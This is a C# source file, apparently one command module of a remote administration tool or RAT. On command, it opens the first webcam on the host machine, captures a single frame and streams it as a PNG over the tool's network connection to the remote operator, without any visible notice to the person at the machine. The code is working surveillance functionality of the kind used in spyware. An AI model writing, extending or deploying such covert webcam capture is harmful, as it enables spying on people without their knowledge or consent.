using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Timers;
using AForge.Video;
using AForge.Video.DirectShow;
using Server.Commands.Core;
using Shared;
using Timer = System.Timers.Timer;

namespace Server.Commands
{
    internal class Webcam : ICommand
    {
        public string name { get; } = "webcam";
        
        VideoCaptureDevice video { get; set; }

        bool mustReturn { get; set; }

        
        public void Process(List<string> args)
        {
            // todo : implement video
            mustReturn = false;

            FilterInfo captureDevice;
            try
            {
                captureDevice = new FilterInfoCollection(FilterCategory.VideoInputDevice)[0];
            }
            catch (Exception)
            {
                ServerCommandsManager.networkManager.WriteLine("NoCam");
                return;
            }

            video = new VideoCaptureDevice(captureDevice.MonikerString);
            video.NewFrame += Video_NewFrame;
            video.Start();

            // Leave 3 seconds to get a frame
            var timer = new Timer(3000);
            timer.Elapsed += timer_Elapsed;
            timer.AutoReset = false;
            timer.Enabled = true;

            while (!mustReturn)
            {
                Thread.Sleep(100);
            }
        }

        void Video_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            video.SignalToStop();
            ServerCommandsManager.networkManager.WriteLine("OK");

            using (var ms = new MemoryStream())
            {
                eventArgs.Frame.Save(ms, ImageFormat.Png);

                // Send the data length first
                ServerCommandsManager.networkManager.WriteLine(ms.Length.ToString());

                // Reset memory stream position
                ms.Position = 0;
                ServerCommandsManager.networkManager.StreamToNetworkStream(ms);
            }

            mustReturn = true;
        }

        void timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            // If the video source is still running, no pic was taken
            if (video.IsRunning)
            {
                ServerCommandsManager.networkManager.WriteLine("KO");
                mustReturn = true;
            }
        }
    }
}
